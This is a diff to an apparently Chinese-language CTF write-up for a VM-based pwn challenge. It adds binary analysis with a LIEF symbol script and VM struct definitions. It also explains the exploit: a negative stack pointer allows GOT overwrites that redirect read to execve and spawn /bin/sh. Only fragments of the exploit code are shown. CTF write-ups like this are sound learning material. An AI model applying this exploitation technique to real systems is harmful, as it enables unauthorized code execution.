@@ -12,13 +12,112 @@
 |NX    |on    |
 |PIE   |off   |
 |strip |yes   |
-|libc  |2.x-xubuntux|
+|libc  |2.35-0ubuntu3.8|
 
 ## 解题思路
 
-todo
+### 分析程序
 
-## EXPLOIT
+典型的vm题。先加载一些符号以便于说明。
+
+```python
+import lief
+
+FILE = './vvmm'
+binary = lief.parse(FILE)
+binary.interpreter = '/libraries/2.35-0ubuntu3.8_amd64/ld-linux-x86-64.so.2'
+binary.add(lief.ELF.DynamicEntryRunPath('.'))
+binary.add_symtab_symbol(lief.ELF.Symbol())
+
+def newsym(name: str, addr: int, end: int) -> lief.ELF.Symbol:
+    sym = lief.ELF.Symbol()
+    sym.name = name
+    sym.value = addr
+    sym.size = end - addr if end else 0
+    sym.binding = lief.ELF.Symbol.BINDING.GLOBAL
+    sym.type = lief.ELF.Symbol.TYPE.FUNC
+    sym.visibility = lief.ELF.Symbol.VISIBILITY.DEFAULT
+    sym.shndx = 15
+    return sym
+
+def newsymobj(name: str, addr: int, size: int) -> lief.ELF.Symbol:
+    sym = lief.ELF.Symbol()
+    sym.name = name
+    sym.value = addr
+    sym.size = size
+    sym.binding = lief.ELF.Symbol.BINDING.GLOBAL
+    sym.type = lief.ELF.Symbol.TYPE.OBJECT
+    sym.visibility = lief.ELF.Symbol.VISIBILITY.DEFAULT
+    sym.shndx = 26
+    return sym
+
+syms = [
+    newsym('main', 0x402afa, 0x402b9c),
+    newsym('vm_run', 0x402992, 0x402ab3),
+    newsym('vm_decode', 0x40125a, 0x4014af),
+    newsym('vm_exec_imm', 0x401546, 0x401c38),
+    newsym('vm_exec_rd', 0x401c38, 0x401e52),
+    newsym('vm_exec_rd_rs', 0x401e52, 0x4024a8),
+    newsym('vm_exec_rd_imm', 0x4024a8, 0x402992),
+    newsym('segv', 0x401239, 0x40125a),
+    newsym('exceed_data', 0x401215, 0x401239),
+    newsym('exceed_reg', 0x4011f6, 0x401215),
+    newsym('system_call', 0x4014af, 0x401546),
+
+    newsymobj('text', 0x4050a0, 0x1000),
+]
+for e in syms:
+    binary.add_symtab_symbol(e)
+binary.write(FILE)
+```
+
+进入`vm_run`可以看到每次运行会先解码指令，然后运行。跟踪到`vm_decode`函数，
+首先会取`pc`处的字节，低2位是寄存器使用类型，高6位存放操作符。
+
+```c
+enum OP_TYPE {
+    IMM = 0,
+    RD = 1,
+    RD_RS = 2,
+    RD_IMM = 3,
+};
+
+struct VM {
+    byte *text;
+    uint pc;
+    ulong regs[6];
+    ulong sp;
+    byte cmp_flag;
+};
+
+struct OP {
+    byte opcode;
+    enum OP_TYPE type;
+    uint rd;
+    uint rs;
+}
+```
+
+> [!IMPORTANT]
+> 题目的IMM指令的加载不按套路出牌啊。别的都是用C语法直接加载，就它是手写的，使用
+> **大端** 并 **只加载 3 个字节** （别的都是4字节）。
+
+在解析完字节码后，程序将数据存放进OP结构体中，然后按照其`type`执行对应的操作，如加减乘除，
+赋值，执行系统调用等。最后返回进入下一个解码、执行循环。
+
+### 对`sp`检查不严格
+
+程序中有着大量的检查防止越界，唯独对栈指针`sp`的检查很宽松，允许其为负数。
+而我们的字节码又是存放在bss区的，因此通过`sp`的相关操作，可以让我们对GOT表做操作。
+为了执行`execve("/bin/sh", NULL, NULL)`，我们可以将字符串放在数据区里，
+然后修改`read@GOT`为`execve@GOT`，最后执行read syscall就可以打开shell了。
+
+<img src="assets/vuln_sp.png" width="60%">
+
+### 汇编hack script
+
+既然是执行字节码的，我们可以写一个汇编器，将人类可读的指令，转换成题目要求的字节码。
+以下是我手写的简易汇编器：(`assembler.py`)
 
 ```python
 #!/usr/bin/python3
@@ -350,6 +449,10 @@ if __name__ == '__main__':
         sys.exit(1)
 ```
 
+最后写汇编exp以及脚本调用汇编器，将字节码发送过去即可。
+
+## EXPLOIT
+
 ```asm
 # hack.s
 # set sp to -0x1060
@@ -402,4 +505,4 @@ def payload(lo: int):
     t.close()
 ```
 
-![flag](assets/iot_flag.png)
+![flag](assets/vm_flag.png)
